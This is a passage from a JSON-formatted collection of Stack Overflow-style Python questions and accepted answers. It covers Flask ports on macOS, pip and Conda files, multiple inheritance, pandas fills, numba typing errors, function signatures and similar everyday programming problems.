    "AcceptedAnswer": "Mac OSX Monterey (12.x) currently uses ports 5000 and 7000 for its Control centre hence the issue.\nTry running your app from port other than 5000 and 7000\nuse this:\nif __name__ == \"__main__\":\n    app.run(port=8000, debug=True)\n\nand then run your flask file, eg: app.py\npython app.py\nYou can also run using the flask command line interface using this command provided you have set the environment variable necessary for flask CLI.\nflask run --port 8000\nYou can also turn off AirPlay Receiver in the Sharing via System Preference.\nRelated discussion here: https://developer.apple.com/forums/thread/682332\nUpdate(November 2022):\nMac OSX Ventura(13.x) still has this problem and is fixed with the change in default port as mentioned above.\n"
}
{
    "Id": 72824468,
    "PostTypeId": 1,
    "Title": "pip installing environment.yml as if it's a requirements.txt",
    "Body": "I have an environment.yml file, but don't want to use Conda:\nname: foo\nchannels:\n  - defaults\ndependencies:\n  - matplotlib=2.2.2\n\nIs it possible to have pip install the dependencies inside an environment.yml file as if it's a requirements.txt file?\nI tried pip install -r environment.yml and it doesn't work with pip==22.1.2.\n",
    "AcceptedAnswerId": 72824497,
    "AcceptedAnswer": "No, pip does not support this format. The format it expects for a requirements file is documented here. You'll have to convert the environment.yml file to a requirements.txt format either manually or via a script that automates this process. However, keep in mind that not all packages on Conda will be available on PyPI.\n"
}
{
    "Id": 72299007,
    "PostTypeId": 1,
    "Title": "How to create instance of multiple inherited class?",
    "Body": "I have this code:\nclass Person:\n    def __init__(self, name, last_name, age):\n        self.name = name\n        self.last_name = last_name\n        self.age = age \n\nclass Student(Person):\n    def __init__(self, name, last_name, age, indexNr, notes):\n        super().__init__(name, last_name, age)\n        self.indexNr = indexNr\n        self.notes = notes\n\nclass Employee(Person):\n    def __init__(self, name, last_name, age, salary, position):\n        super().__init__(name, last_name, age)\n        self.salary = salary\n        self.position = position\n\nclass WorkingStudent(Student, Employee):\n    def __init__(self, name, last_name, age, indexNr, notes, salary, position):\n        Student.__init__(name, last_name, age, indexNr, notes)\n        Employee.__init__(name, last_name, age, salary, position)\n\nI want to create a WorkingStudent instance like this:\nws = WorkingStudent(\"john\", \"brown\", 18, 1, [1,2,3], 1000, 'Programmer')\n\nbut it's not working, I get this error:\nTypeError: __init__() missing 1 required positional argument: 'notes'\n\nOr what I am doing wrong here? Also, I have already tried super() in WorkingStudent class but it calls only the constructor of the first passed class. i.e in this case Student\nNote: I have already gone through multiple StackOverflow queries but I couldn't find anything that could answer this. (or maybe I have missed).\n",
    "AcceptedAnswerId": 72299178,
    "AcceptedAnswer": "Instead of explicit classes, use super() to pass arguments along the mro:\nclass Person:\n    def __init__(self, name, last_name, age):\n        self.name = name\n        self.last_name = last_name\n        self.age = age \n\nclass Student(Person):\n    def __init__(self, name, last_name, age, indexNr, notes, salary, position):\n        # since Employee comes after Student in the mro, pass its arguments using super\n        super().__init__(name, last_name, age, salary, position)\n        self.indexNr = indexNr\n        self.notes = notes\n\nclass Employee(Person):\n    def __init__(self, name, last_name, age, salary, position):\n        super().__init__(name, last_name, age)\n        self.salary = salary\n        self.position = position\n\nclass WorkingStudent(Student, Employee):\n    def __init__(self, name, last_name, age, indexNr, notes, salary, position):\n        # pass all arguments along the mro\n        super().__init__(name, last_name, age, indexNr, notes, salary, position)\n\n# uses positional arguments            \nws = WorkingStudent(\"john\", \"brown\", 18, 1, [1,2,3], 1000, 'Programmer')\n# then you can print stuff like\nprint(f\"My name is {ws.name} {ws.last_name}. I'm a {ws.position} and I'm {ws.age} years old.\")\n# My name is john brown. I'm a Programmer and I'm 18 years old.\n\nCheck mro:\nWorkingStudent.__mro__\n(__main__.WorkingStudent,\n __main__.Student,\n __main__.Employee,\n __main__.Person,\n object)\n\n\nWhen you create an instance of WorkingStudent, it's better if you pass keyword arguments so that you don't have to worry about messing up the order of arguments.\nSince WorkingStudent defers the definition of attributes to parent classes, immediately pass all arguments up the hierarchy using super().__init__(**kwargs) since a child class doesn't need to know about the parameters it doesn't handle. The first parent class is Student, so self.IndexNr etc are defined there. The next parent class in the mro is Employee, so from Student, pass the remaining keyword arguments to it, using super().__init__(**kwargs) yet again. From Employee, define the attributes defined there and pass the rest along the mro (to Person) via super().__init__(**kwargs) yet again.\nclass Person:\n    def __init__(self, name, last_name, age):\n        self.name = name\n        self.last_name = last_name\n        self.age = age \n\nclass Student(Person):\n    def __init__(self, indexNr, notes, **kwargs):\n        # since Employee comes after Student in the mro, pass its arguments using super\n        super().__init__(**kwargs)\n        self.indexNr = indexNr\n        self.notes = notes\n\nclass Employee(Person):\n    def __init__(self, salary, position, **kwargs):\n        super().__init__(**kwargs)\n        self.salary = salary\n        self.position = position\n\nclass WorkingStudent(Student, Employee):\n    def __init__(self, **kwargs):\n        # pass all arguments along the mro\n        super().__init__(**kwargs)\n\n# keyword arguments (not positional arguments like the case above)\nws = WorkingStudent(name=\"john\", last_name=\"brown\", age=18, indexNr=1, notes=[1,2,3], salary=1000, position='Programmer')\n\n"
}
{
    "Id": 71886600,
    "PostTypeId": 1,
    "Title": "Algorithm for ordering data so that neighbor elements are as identical as possible",
    "Body": "I have a (potentially large) list data of 3-tuples of small non-negative integers, like\ndata = [\n    (1, 0, 5),\n    (2, 4, 2),\n    (3, 2, 1),\n    (4, 3, 4),\n    (3, 3, 1),\n    (1, 2, 2),\n    (4, 0, 3),\n    (0, 3, 5),\n    (1, 5, 1),\n    (1, 5, 2),\n]\n\nI want to order the tuples within data so that neighboring tuples (data[i] and data[i+1]) are \"as similar as possible\".\nDefine the dissimilarity of two 3-tuples as the number of elements which are unequal between them. E.g.\n\n(0, 1, 2) vs. (0, 1, 2): Dissimilarity 0.\n(0, 1, 2) vs. (0, 1, 3): Dissimilarity 1.\n(0, 1, 2) vs. (0, 2, 1): Dissimilarity 2.\n(0, 1, 2) vs. (3, 4, 5): Dissimilarity 3.\n(0, 1, 2) vs. (2, 0, 1): Dissimilarity 3.\n\nQuestion: What is a good algorithm for finding the ordering of data which minimizes the sum of dissimilarities between all neighboring 3-tuples?\nSome code\nHere's a function which computes the dissimilarity between two 3-tuples:\ndef dissimilar(t1, t2):\n    return sum(int(a != b) for a, b in zip(t1, t2))\n\nHere's a function which computes the summed total dissimilarity of data, i.e. the number which I seek to minimize:\ndef score(data):\n    return sum(dissimilar(t1, t2) for t1, t2 in zip(data, data[1:]))\n\nThe problem can be solved by simply running score() over every permutation of data:\nimport itertools\nn_min = 3*len(data)  # some large number\nfor perm in itertools.permutations(data):\n    n = score(perm)\n    if n < n_min:\n        n_min = n\n        data_sorted = list(perm)\nprint(data_sorted, n_min)\n\nThough the above works, it's very slow as we explicitly check each and every permutation (resulting in O(N!) complexity). On my machine the above takes about 20 seconds when data has 10 elements.\nFor completeness, here's the result of running the above given the example data:\ndata_sorted = [\n    (1, 0, 5),\n    (4, 0, 3),\n    (4, 3, 4),\n    (0, 3, 5),\n    (3, 3, 1),\n    (3, 2, 1),\n    (1, 5, 1),\n    (1, 5, 2),\n    (1, 2, 2),\n    (2, 4, 2),\n]\n\nwith n_min = 15. Note that several other orderings (10 in total) with a score of 15 exist. For my purposes these are all equivalent and I just want one of them.\nFinal remarks\nIn practice the size of data may be as large as say 10000.\nThe sought-after algorithm should beat O(N!), i.e. probably be polynomial in time (and space).\nIf no such algorithm exists, I would be interested in \"near-solutions\", i.e. a fast algorithm which gives an ordering of data with a small but not necessarily minimal total score. One such algorithm would be lexicographic sorting, i.e.\nsorted(data)  # score 18\n\nthough I hope to be able to do better than this.\nEdit (comments on accepted solution)\nI have tried all of the below heuristic solutions given as code (I have not tried e.g. Google OR-tools). For large len(data), I find that the solution of Andrej Kesely is both quick and gives the best results.\nThe idea behind this method is quite simple. The sorted list of data elements (3-tuples) is built up one by one. Given some data element, the next element is chosen to be the most similar one out of the remaining (not yet part of the sorted) data.\nEssentially this solves a localized version of the problem where we only \"look one ahead\", rather than optimizing globally over the entire data set. We can imagine a hierarchy of algorithms looking n ahead, each successively delivering better (or at least as good) results but at the cost of being much more expensive. The solution of Andrej Kesely then sits lowest in this hierarchy. The algorithm at the highest spot, looking len(data) ahead, solves the problem exactly.\nLet's settle for \"looking 1 ahead\", i.e. the answer by Andrej Kesely. This leaves room for a) the choice of initial element, b) what to do when several elements are equally good candidates (same dissimilarity) for use as the next one. Choosing the first element in data as the initial element and the first occurrence of an element with minimal dissimilarity, both a) and b) are determined from the original order of elements within data. As Andrej Kesely points out, it then helps to (lex)sort data in advance.\nIn the end I went with this solution, but refined in a few ways:\n\nI try out the algorithm for 6 initial sortings of data; lex sort for columns (0, 1, 2), (2, 0, 1), (1, 2, 0), all in ascending as well as descending order.\nFor large len(data), the algorithm becomes too slow for me. I suspect it scales like O(n\u00b2). I thus process chunks of the data of size n_max independently, with the final result being the different sorted chunks concatenated. Transitioning from one chunk to the next we expect a dissimilarity of 3, but this is unimportant if we keep n_max large. I go with n_max = 1000.\n\nAs an implementation note, the performance can be improved by not using data.pop(idx) as this itself is O(n). Instead, either leave the original data as is and use another data structure for keeping track of which elements/indices have been used, or replace data[idx] with some marker value upon use.\n",
    "AcceptedAnswerId": 71890278,
    "AcceptedAnswer": "This isn't exact algorithm, just heuristic, but should be better that naive sorting:\n# you can sort first the data for lower total average score:\n# data = sorted(data)\n\nout = [data.pop(0)]\nwhile data:\n    idx, t = min(enumerate(data), key=lambda k: dissimilar(out[-1], k[1]))\n    out.append(data.pop(idx))\n\n\nprint(score(out))\n\n\nTesting (100 repeats with data len(data)=1000):\nimport random\nfrom functools import lru_cache\n\n\ndef get_data(n=1000):\n    f = lambda n: random.randint(0, n)\n    return [(f(n // 30), f(n // 20), f(n // 10)) for _ in range(n)]\n\n\n@lru_cache(maxsize=None)\ndef dissimilar(t1, t2):\n    a, b, c = t1\n    x, y, z = t2\n    return (a != x) + (b != y) + (c != z)\n\n\ndef score(data):\n    return sum(dissimilar(t1, t2) for t1, t2 in zip(data, data[1:]))\n\n\ndef lexsort(data):\n    return sorted(data)\n\n\ndef heuristic(data, sort_data=False):\n    data = sorted(data) if sort_data else data[:]\n    out = [data.pop(0)]\n    while data:\n        idx, t = min(enumerate(data), key=lambda k: dissimilar(out[-1], k[1]))\n        out.append(data.pop(idx))\n    return out\n\n\nN, total, total_lexsort, total_heuristic, total_heuristic2 = 100, 0, 0, 0, 0\nfor i in range(N):\n    data = get_data()\n    r0 = score(data)\n    r1 = score(lexsort(data))\n    r2 = score(heuristic(data))\n    r3 = score(heuristic(data, True))\n    print(\"original data\", r0)\n    print(\"lexsort\", r1)\n    print(\"heuristic\", r2)\n    print(\"heuristic with sorted\", r3)\n\n    total += r0\n    total_lexsort += r1\n    total_heuristic += r2\n    total_heuristic2 += r3\n\nprint(\"total original data score\", total)\nprint(\"total score lexsort\", total_lexsort)\nprint(\"total score heuristic\", total_heuristic)\nprint(\"total score heuristic(with sorted)\", total_heuristic2)\n\nPrints:\n...\n\ntotal original data score 293682\ntotal score lexsort 178240\ntotal score heuristic 162722\ntotal score heuristic(with sorted) 160384\n\n"
}
{
    "Id": 72312594,
    "PostTypeId": 1,
    "Title": "Pandas forward fill, but only between equal values",
    "Body": "I have two data frames: main and auxiliary. I am concatenating auxiliary to the main. It results in NaN in a few rows and I want to fill them, not all.\nCode:\ndf1 = pd.DataFrame({'Main':[00,10,20,30,40,50,60,70,80]})\ndf1 = \n   Main\n0     0\n1    10\n2    20\n3    30\n4    40\n5    50\n6    60\n7    70\n8    80\ndf2 = pd.DataFrame({'aux':['aa','aa','bb','bb']},index=[0,2,5,7])\ndf2 = \n  aux\n0   aa  \n2   aa\n5   bb\n7   bb\ndf = pd.concat([df1,df2],axis=1)\n# After concating, in the aux column, I want to fill the NaN rows in between \n# the rows with same value. Example, fill rows between 0 and 2 with 'aa', 2 and 5 NaN, 5 and 7 with 'bb'\ndf = pd.concat([df1,df2],axis=1).fillna(method='ffill')\nprint(df)\n\nPresent result:\n  Main aux\n0    0   aa\n1   10   aa\n2   20   aa\n3   30   aa # Wrong, here it should be NaN\n4   40   aa # Wrong, here it should be NaN\n5   50   bb \n6   60   bb\n7   70   bb\n8   80   bb # Wrong, here it should be NaN\n\nExpected result:\n  Main aux\n0    0   aa\n1   10   aa\n2   20   aa\n3   30  NaN\n4   40  NaN\n5   50   bb\n6   60   bb\n7   70   bb\n8   80  NaN\n\n",
    "AcceptedAnswerId": 72312653,
    "AcceptedAnswer": "If I understand correctly, what you want can be done like this. You want to fill the NaNs where backfill and forward fill give the same value.\nff = df.aux.ffill()\nbf = df.aux.bfill()\ndf.aux = ff[ff == bf]\n\n"
}
{
    "Id": 71709229,
    "PostTypeId": 1,
    "Title": "VSCode debugger can not import queue due to shadowing",
    "Body": "When I try to run any python code in debug mode using VScode, I got an error message saying:\n42737 -- /home//Desktop/development/bopi/experiment_handler.py .vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/launcher 4\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/runpy.py\", line 174, in _run_module_as_main\n    \"__main__\", fname, loader, pkg_name)\n  File \"/usr/lib/python2.7/runpy.py\", line 72, in _run_code\n    exec code in run_globals\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/__main__.py\", line 43, in \n    from debugpy.server import cli\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/../debugpy/server/__init__.py\", line 9, in \n    import debugpy._vendored.force_pydevd  # noqa\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/../debugpy/_vendored/force_pydevd.py\", line 37, in \n    pydevd_constants = import_module('_pydevd_bundle.pydevd_constants')\n  File \"/usr/lib/python2.7/importlib/__init__.py\", line 37, in import_module\n    __import__(name)\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydevd_bundle/pydevd_constants.py\", line 362, in \n    from _pydev_bundle._pydev_saved_modules import thread, threading\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydev_bundle/_pydev_saved_modules.py\", line 97, in \n    import queue as _queue;    verify_shadowed.check(_queue, ['Queue', 'LifoQueue', 'Empty', 'Full', 'deque'])\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydev_bundle/_pydev_saved_modules.py\", line 75, in check\n    raise DebuggerInitializationError(msg)\n_pydev_bundle._pydev_saved_modules.DebuggerInitializationError: It was not possible to initialize the debugger due to a module name conflict.\n\ni.e.: the module \"queue\" could not be imported because it is shadowed by:\n/home//.local/lib/python2.7/site-packages/queue/__init__.pyc\nPlease rename this file/folder so that the original module from the standard library can be imported.\n\nDeleting the init.pyc and init.py resulting with an error message about missing queue import.\n",
    "AcceptedAnswerId": 71711905,
    "AcceptedAnswer": "Downgrading my Python extension in Visual Studio Code to v2022.2.1924087327 worked for me.\nElevating @Onur Berk's comment below as part of the answer:\n\nIts is very easy to downgrade the python extension, just click 'extensions' and find the Python extension and select it. Rather than clicking 'uninstall' click the arrow next to it, this will give you an option to install another version\n\n"
}
{
    "Id": 71902946,
    "PostTypeId": 1,
    "Title": "numba: No implementation of function Function(<built-in function getitem>) found for signature:",
    "Body": "I\u00b4m having a hard time implementing numba to my function.\nBasically, I`d like to concatenate to arrays with 22 columns, if the new data hasn't been added yet. If there is no old data, the new data should become a 2d array.\nThe function works fine without the decorator:\n@jit(nopython=True)\ndef add(new,original=np.array([])):\n  duplicate=True\n  if original.size!=0:\n    for raw in original:\n      for ii in range(11,19):\n        if raw[ii]!=new[ii]:\n          duplicate=False\n    if duplicate==False:\n      res=np.zeros((original.shape[0]+1,22))\n      res[:original.shape[0]]=original\n      res[-1]=new\n      return res\n    else:\n      return original\n  else:\n    res=np.zeros((1,22))\n    res[0]=new\n    return res\n\nAlso if I remove the last part of the code:\n  else:\n    res=np.zeros((1,22))\n    res[0]=new\n    return res\n\nIt would work with njit\nSo if I ignore the case, that there hasn\u00b4t been old data yet, everything would be fine.\nFYI: the data I`m passing in is mixed float and np.nan.\nAnybody an idea?\nThank you so much in advance!\nthis is my error log:\n---------------------------------------------------------------------------\nTypingError                               Traceback (most recent call last)\n in ()\n     19     return res\n     20 #add(a,np.array([b]))\n---> 21 add(a)\n\n2 frames\n/usr/local/lib/python3.7/dist-packages/numba/core/dispatcher.py in _compile_for_args(self, *args, **kws)\n    413                 e.patch_message(msg)\n    414 \n--> 415             error_rewrite(e, 'typing')\n    416         except errors.UnsupportedError as e:\n    417             # Something unsupported is present in the user code, add help info\n\n/usr/local/lib/python3.7/dist-packages/numba/core/dispatcher.py in error_rewrite(e, issue_type)\n    356                 raise e\n    357             else:\n--> 358                 reraise(type(e), e, None)\n    359 \n    360         argtypes = []\n\n/usr/local/lib/python3.7/dist-packages/numba/core/utils.py in reraise(tp, value, tb)\n     78         value = tp()\n     79     if value.__traceback__ is not tb:\n---> 80         raise value.with_traceback(tb)\n     81     raise value\n     82 \n\nTypingError: Failed in nopython mode pipeline (step: nopython frontend)\nNo implementation of function Function() found for signature:\n \n >>> getitem(float64, int64)\n \nThere are 22 candidate implementations:\n      - Of which 22 did not match due to:\n      Overload of function 'getitem': File: : Line N/A.\n        With argument(s): '(float64, int64)':\n       No match.\n\nDuring: typing of intrinsic-call at  (7)\n\nFile \"\", line 7:\ndef add(new,original=np.array([])):\n    \n      for ii in range(11,19):\n        if raw[ii]!=new[ii]:\n        ^\n\nUpdate:\nHere is how it should work. The function shall cover three main cases\nsample input for new data (1d array):\narray([9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,\n       0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,\n       9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,\n       1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,\n       9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,\n                 nan,           nan])\n\nsample input for original data (2d array):\narray([[4.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,\n        0.00000000e+00,            nan, 5.23000000e-01, 8.31589755e-01,\n        8.34804877e-01, 8.28374632e-01, 8.36090000e-01, 1.64938320e+09,\n        1.64966400e+09, 1.64968920e+09, 1.64975760e+09, 8.30750000e-01,\n        8.38020000e-01, 8.34290000e-01, 8.36090000e-01,            nan,\n                   nan,            nan]])\n\n\nnew data will be added and there is no original data\n\nadd(new)\nOutput:\n\narray([[9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,\n        0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,\n        9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,\n        1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,\n        9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,\n                  nan,           nan]])\n\n\nnew data will be added, which hasn\u00b4t already been added before and there is original data\n\nadd(new,original)\nOutput:\narray([[4.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,\n        0.00000000e+00,            nan, 5.23000000e-01, 8.31589755e-01,\n        8.34804877e-01, 8.28374632e-01, 8.36090000e-01, 1.64938320e+09,\n        1.64966400e+09, 1.64968920e+09, 1.64975760e+09, 8.30750000e-01,\n        8.38020000e-01, 8.34290000e-01, 8.36090000e-01,            nan,\n                   nan,            nan],\n       [9.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,\n        0.00000000e+00,            nan, 5.73000000e-01, 9.26054500e-01,\n        9.31717250e-01, 9.20391750e-01, 9.34500000e-01, 1.64916360e+09,\n        1.64942280e+09, 1.64969280e+09, 1.64975040e+09, 9.23770000e-01,\n        9.37380000e-01, 9.30380000e-01, 9.34500000e-01,            nan,\n                   nan,            nan]])\n\n\n\nnew data will be added, which already had been added before\n\nadd(new,original)\nOutput:\n\narray([[9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,\n        0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,\n        9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,\n        1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,\n        9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,\n                  nan,           nan]])\n\n",
    "AcceptedAnswerId": 71903983,
    "AcceptedAnswer": "The main issue is that Numba assumes that original is a 1D array while this is not the case. The pure-Python code works because the interpreter it never execute the body of the loop for raw in original but Numba need to compile all the code before its execution. You can solve this problem using the following function prototype:\ndef add(new,original=np.array([[]])):  # Note the `[[]]` instead of `[]`\n\nWith that, Numba can deduce correctly that the original array is a 2D one.\nNote that specifying the dimension and types of Numpy arrays and inputs is a good method to avoid such errors and sneaky bugs (eg. due to integer/float truncation).\n"
}
{
    "Id": 71735869,
    "PostTypeId": 1,
    "Title": "How to reduce number if-statements using dict?",
    "Body": "I have the following code with multiple cases:\ndef _extract_property_value(selector: Selector) -> str:\n    raw_value = selector.xpath(\"span[2]\")\n\n    default_value = raw_value.xpath(\"./text()\").get().strip()\n    value_with_a = ', '.join([value.strip() for value in raw_value.xpath(\"./a /text()\").getall()])\n    value_with_div_and_a = ', '.join([value.strip() for value in raw_value.xpath(\"./div /a /text()\").getall()])\n\n    if value_with_a:\n        return value_with_a\n    elif value_with_div_and_a:\n        return value_with_div_and_a\n    elif default_value:\n        return default_value\n\nI want to get rid of if-statements and simplify this code as much as it is possible. I am not good Pyton dev. I know there is pattern \"strategy\" and below I was trying to implement that:\ndef _extract_property_value(selector: Selector) -> str:\n    raw_value = selector.xpath(\"span[2]\")\n    values_dict = {\n        'default value': raw_value.xpath(\"./text()\").get().strip(),\n        'value with a': ', '.join([value.strip() for value in raw_value.xpath(\"./a /text()\").getall()]),\n        'value with div and a': ', '.join([value.strip() for value in raw_value.xpath(\"./div /a /text()\").getall()])\n    }\n    return [item for item in values_dict.values() if item != ''][0]\n\nbut... Now when I think of this - that was bad idea to use strategy there. I am not sure. Can someone help me to simplify that code? Or those if-statements are just necessary.\n",
    "AcceptedAnswerId": 71736271,
    "AcceptedAnswer": "We can reduce the number of if statements but without the aid of a dictionary.\nThe code in question unconditionally assigns values to 3 variables. Having done so, those variables are examined to determine which, if any, is to be returned to the caller. However, there are no dependencies between those variables. Therefore they could be processed in order of priority and, if an appropriate value is acquired, then it could be returned immediately thereby making the process considerably more efficient.\ndef _extract_property_value(selector):\n    def f1(rv):\n        return rv.xpath(\"./text()\").get().strip()\n    def f2(rv):\n        return ', '.join([value.strip() for value in rv.xpath(\"./a /text()\").getall()])\n    def f3(rv):\n        return ', '.join([value.strip() for value in rv.xpath(\"./div /a /text()\").getall()])\n    raw_value = selector.xpath(\"span[2]\")\n    for func in [f2, f3, f1]: # note the priority order - default last\n        if (v := func(raw_value)):\n            return v\n\nThe revised function will implicitly return None if suitable values are not found. In this respect it is no different to the OP's original code\n"
}
{
    "Id": 71739870,
    "PostTypeId": 1,
    "Title": "How to install Python 2 on macOS 12.3+",
    "Body": "macOS 12.3 update drops Python 2 and replaces it with version 3:\nhttps://developer.apple.com/documentation/macos-release-notes/macos-12_3-release-notes\n\nPython\nDeprecations\nPython 2.7 was removed from macOS in this update. Developers should use Python 3 or an alternative language instead. (39795874)\n\nI understand we need to migrate to version 3, but in the meantime we still need version 2. Homebrew does not seem to have it anymore:\nbrew install python@2.7\nWarning: No available formula with the name \"python@2.7\". Did you mean python@3.7, python@3.9, python@3.8, python@3.10 or python-yq?\n\nbrew install python2\nWarning: No available formula with the name \"python2\". Did you mean ipython, bpython, jython or cython?\n\nWhat gives?\n",
    "AcceptedAnswerId": 71740144,
    "AcceptedAnswer": "You can get any Python release, including the last Python 2, from the official download site:\nhttps://www.python.org/downloads/release/python-2718/ \u2192 macOS 64-bit installer\n"
}
{
    "Id": 72204649,
    "PostTypeId": 1,
    "Title": "Single-file history format/library for binary files?",
    "Body": "My application is going to edit a bunch of large files, completely unrelated to each other (belonging to different users), and I need to store checkpoints of the previous state of the files.  Delta compression should work extremely well on this file format.  I only need a linear history, not branches or merges.\nThere are low-level libraries that give part of the solution, for example xdelta3 sounds like a good binary diff/patch system.\nRCS actually seems like a pretty close match to my problem, but doesn't handle binary files well.\ngit provides a complete solution to my problem, but is an enormous suite of programs, and its storage format is an entire directory.\nIs there anything less complicated than git that would:\n\nwork on binary files\nperform delta compression\nlet me commit new \"newest\" versions\nlet me recall old versions\n\nBonus points if it would:\n\nhave a single-file storage format\nbe available as a C, C++, or Python library\n\nI can't even find the right combination of words to google for this category of program, so that would also be helpful.\n",
    "AcceptedAnswerId": 72343489,
    "AcceptedAnswer": "From RCS manual (1. Overview)\n\n[RCS] can handle text as well as binary files, although functionality is reduced for the latter.\n\nRCS seems a good option worth to try.\nI work for a Foundation which has been using RCS to keep under version control tens of thousands of completely unrelated files (git or hg are not an option). Mostly text, but also some media files, which are binary in nature.\nRCS does work quite well with binary files, only make sure not to use the Substitute mode options, to avoid inadvertently substituting binary bits that looks like $ Id.\nTo see if this could work for you, you could for example try with a Photoshop image, put it under version control with RCS. Then change a part, or add a layer, and commit the change. You could then verify how well RCS can manage binary files for you.\nRCS has been serving us quite well. It is well maintained, reliable, predictable, and definitely worth a try.\n"
}
{
    "Id": 71990420,
    "PostTypeId": 1,
    "Title": "How do I efficiently find which elements of a list are in another list?",
    "Body": "I want to know which elements of list_1 are in list_2. I need the output as an ordered list of booleans. But I want to avoid for loops, because both lists have over 2 million elements.\nThis is what I have and it works, but it's too slow:\nlist_1 = [0,0,1,2,0,0]\nlist_2 = [1,2,3,4,5,6]\n\nbooleans = []\nfor i in list_1:\n   booleans.append(i in list_2)\n\n# booleans = [False, False, True, True, False, False]\n\nI could split the list and use multithreading, but I would prefer a simpler solution if possible. I know some functions like sum() use vector operations. I am looking for something similar.\nHow can I make my code more efficient?\n",
    "AcceptedAnswerId": 71990529,
    "AcceptedAnswer": "If you want to use a vector approach you can also use Numpy isin. It's not the fastest method, as demonstrated by oda's excellent post, but it's definitely an alternative to consider.\nimport numpy as np\n\nlist_1 = [0,0,1,2,0,0]\nlist_2 = [1,2,3,4,5,6]\n\na1 = np.array(list_1)\na2 = np.array(list_2)\n\nnp.isin(a1, a2)\n# array([False, False,  True,  True, False, False])\n\n"
}
{
    "Id": 72236445,
    "PostTypeId": 1,
    "Title": "How can I wrap a python function in a way that works with with inspect.signature?",
    "Body": "Some uncontroversial background experimentation up front:\nimport inspect\n\ndef func(foo, bar):\n  pass\n\nprint(inspect.signature(func))  # Prints \"(foo, bar)\" like you'd expect\n\ndef decorator(fn):\n  def _wrapper(baz, *args, *kwargs):\n    fn(*args, **kwargs)\n\n  return _wrapper\n\nwrapped = decorator(func)\nprint(inspect.signature(wrapped))  # Prints \"(baz, *args, **kwargs)\" which is totally understandable\n\nThe Question\nHow can implement my decorator so that print(inspect.signature(wrapped)) spits out \"(baz, foo, bar)\"?  Can I build _wrapper dynamically somehow by adding the arguments of whatever fn is passed in, then gluing baz on to the list?\nThe answer is NOT\ndef decorator(fn):\n  @functools.wraps(fn)\n  def _wrapper(baz, *args, *kwargs):\n    fn(*args, **kwargs)\n\n  return _wrapper\n\nThat give \"(foo, bar)\" again - which is totally wrong.  Calling wrapped(foo=1, bar=2) is a type error - \"Missing 1 required positional argument: 'baz'\"\nI don't think it's necessary to be this pedantic, but\ndef decorator(fn):\n  def _wrapper(baz, foo, bar):\n    fn(foo=foo, bar=bar)\n\n  return _wrapper\n\nIs also not the answer I'm looking for - I'd like the decorator to work for all functions.\n",
    "AcceptedAnswerId": 72242606,
    "AcceptedAnswer": "You can use __signature__ (PEP) attribute to modify returned signature of wrapped object. For example:\nimport inspect\n\n\ndef func(foo, bar):\n    pass\n\n\ndef decorator(fn):\n    def _wrapper(baz, *args, **kwargs):\n        fn(*args, **kwargs)\n\n    f = inspect.getfullargspec(fn)\n\n    fn_params = []\n    if f.args:\n        for a in f.args:\n            fn_params.append(\n                inspect.Parameter(a, inspect.Parameter.POSITIONAL_OR_KEYWORD)\n            )\n\n    if f.varargs:\n        fn_params.append(\n            inspect.Parameter(f.varargs, inspect.Parameter.VAR_POSITIONAL)\n        )\n\n    if f.varkw:\n        fn_params.append(\n            inspect.Parameter(f.varkw, inspect.Parameter.VAR_KEYWORD)\n        )\n\n    _wrapper.__signature__ = inspect.Signature(\n        [\n            inspect.Parameter(\"baz\", inspect.Parameter.POSITIONAL_OR_KEYWORD),\n            *fn_params,\n        ]\n    )\n    return _wrapper\n\n\nwrapped = decorator(func)\nprint(inspect.signature(wrapped))\n\nPrints:\n(baz, foo, bar)\n\n\nIf the func is:\ndef func(foo, bar, *xxx, **yyy):\n    pass\n\nThen print(inspect.signature(wrapped)) prints:\n(baz, foo, bar, *xxx, **yyy)\n\n"
}
{
    "Id": 72804712,
    "PostTypeId": 1,
    "Title": "How to accelerate numpy.unique and provide both counts and duplicate row indices",
